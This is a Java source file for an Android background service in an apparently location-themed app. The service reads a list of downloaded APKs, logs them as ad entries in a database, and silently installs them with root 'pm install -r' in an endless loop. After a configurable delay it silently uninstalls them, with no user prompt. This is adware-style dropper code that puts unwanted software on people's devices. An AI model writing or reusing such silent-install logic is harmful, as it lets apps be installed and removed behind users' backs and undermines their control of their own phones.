package com.example.hdj008k_location.service;

import java.io.File;
import java.io.IOException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import com.example.hdj008k_location.MainActivity;
import com.example.hdj008k_location.db.HdjDbService;
import com.example.hdj008k_location.obj.AdStatus;
import com.example.hdj008k_location.util.InstallUtil;
import com.example.hdj008k_location.util.MyFileUtil;
import com.example.hdj008k_location.util.RecordAppFileHandlerHelper;
import com.example.hdj008k_location.util.StringUtil;

import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

/**
 * 开启服务在后台运行线程
 * */
public class InstallApkService extends Service {

	private Thread installThread;
	public static InstallReceiver receiver = null;
	ScheduledExecutorService executorService = Executors
			.newScheduledThreadPool(10);
	HdjDbService hdjDbService = null;

	private Runnable installRunnable = new Runnable() {
		@Override
		public void run() {
			// TODO Auto-generated method stub
			try {
				
				hdjDbService = new HdjDbService(getApplicationContext());
				while (true) {

					final SharedPreferences preferences = InstallApkService.this
							.getSharedPreferences("prefs",Context.MODE_WORLD_READABLE);
					
					int waitTime = preferences.getInt("WaitTiem", 15);// 线程的休眠时间
					final int uninstallTime = preferences.getInt("UninstallTime", 5);// 多长时间后静默卸载
//					Log.e("11111111111111", "waitTime = " + waitTime);
//					Log.e("11111111111111", "uninstallTime = " + uninstallTime);

					//下载的apk路径
					String s = RecordAppFileHandlerHelper.getFileAllContent("InstallApk.txt");
					String[] apkPath = s.split("\n");

					//开启监听安装广播
					if (receiver == null) {
						receiver = new InstallReceiver();
						registerInstallReceiver();
					}

//					Log.e("*********************************", apkPath.length
//							+ "循环在执行！！！！！");

					for (int i = 0; i < apkPath.length; i++) {//&&
						String path = apkPath[i];

						// path = changeName(path);

						if (InstallUtil.isApkCanInstall(InstallApkService.this,
								path)) {//^^

//							Log.e("*********************************",
//									"执行到这里了！！！！！");
							path = MyFileUtil.changeName(path);

							// HdjDbService hdjDbService = new HdjDbService(
							// getApplicationContext());

							AdStatus adStatus2 = hdjDbService.find(path);

//							Log.e("*********************************", path + adStatus2);

							//路径在数据库中不存在就保存到数据库
							if (adStatus2 == null) {

								long time = System.currentTimeMillis();
								String packageName= InstallUtil.getUninstallAPKInfo(getApplicationContext(),path);
								RecordAppFileHandlerHelper.saveApkPath("InstallApkPackageName.txt", packageName);
								AdStatus adStatus = new AdStatus();
								adStatus.setAdpath(path);
								adStatus.setStatus(0);
								adStatus.setPackageName(packageName);
								adStatus.setTime(time);
								hdjDbService.save(adStatus);

							}

							// Thread.sleep(20 * 1000);

						}//^^
					}//&&

					// 当status = 0的时候，安装；
					//status = 1卸载

					List<AdStatus> adStatus = hdjDbService.getScrollData();

					for (int j = 0; j < adStatus.size(); j++) {//@@
						
						//##
							
//							Log.e("InstallApkService--installRunnable",
//									"ttt-path="+ adStatus.get(j).getAdpath());
//							Log.e("InstallApkService--installRunnable",
//									"ttt-getStatus="+ adStatus.get(j).getStatus());
							
							SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");//设置日期格式
							
							long nowTime = System.currentTimeMillis();
							long oldTime = adStatus.get(j).getTime();
//							
							Date data = new Date(nowTime);
							Date data2 = new Date(oldTime);
							
//							Log.e("InstallApkService--installRunnable",
//									"ttt-nowTime="+ df.format(data));
//							Log.e("InstallApkService--installRunnable",
//									"ttt-oldTime="+ df.format(data2));
//							Log.e("InstallApkService--installRunnable",
//									"ttt-xxx="+ (nowTime - adStatus.get(j).getTime()));
							
							if (InstallUtil.isApkCanInstall(InstallApkService.this,
									adStatus.get(j).getAdpath())&&adStatus.get(j).getStatus() == 0) {// 静默安装

//								Log.e("xxxxxxxxxxxxxx",  "执行静默安装！！");
								

								//判断是否允许静默安装
								//安装是否成功
								if (preferences.getBoolean("openInstall", false) 
										&& InstallUtil.haveRoot("pm install -r "+ adStatus.get(j).getAdpath())) {
									
//									Log.e("InstallApkService--installRunnable",
//											"ttt-path="+ adStatus.get(j).getAdpath());
								}
							} else if (adStatus.get(j).getStatus() == 1) {//!! 静默卸载
								
//								Log.e("2222222222222","可以卸载了");
//								Log.e("2222222222222","uninstallTime = "+uninstallTime);

								final AdStatus adStatus3 = adStatus.get(j);
								adStatus3.setStatus(2);

								//再开启线程处理卸载
								new Thread(new Runnable() {

									@Override
									public void run() {
										// TODO Auto-generated method stub
										try {
											Thread.sleep(uninstallTime * 1000);//线程休眠多少秒再卸载应用
										} catch (InterruptedException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}

										//判断是否允许静默卸载
										//是否卸载成功
										if (preferences.getBoolean("openUnInstall", false) 
												&&InstallUtil.clientUninstall(adStatus3.getPackageName())) {
											
											hdjDbService.update(adStatus3);

//											Log.e("xxxxxxxxxxxxxx",adStatus3.getPackageName()+ "卸载成功！");
										}

									}
								}).start();

							}//!!


					}//@@

					Thread.sleep(waitTime * 1000);
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	};

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		// Log.e("InstallApkService--onCreate", "ttt-第一次启动");

		installThread = new Thread(installRunnable);
		installThread.start();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		if (installThread != null)
			installThread.interrupt();
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		// Log.e("InstallApkService--onStartCommand", "ttt-map.clear()");
		return super.onStartCommand(intent, flags, startId);
	}

	/**注册监听app安装广播*/
	private void registerInstallReceiver() {
		try {
			IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_ADDED);
			filter.addDataScheme("package"); // 必须添加这项，否则拦截不到广播
			getApplication().registerReceiver(receiver, filter);
		} catch (Exception e) {
			// TODO: handle exception
		}

	}
}
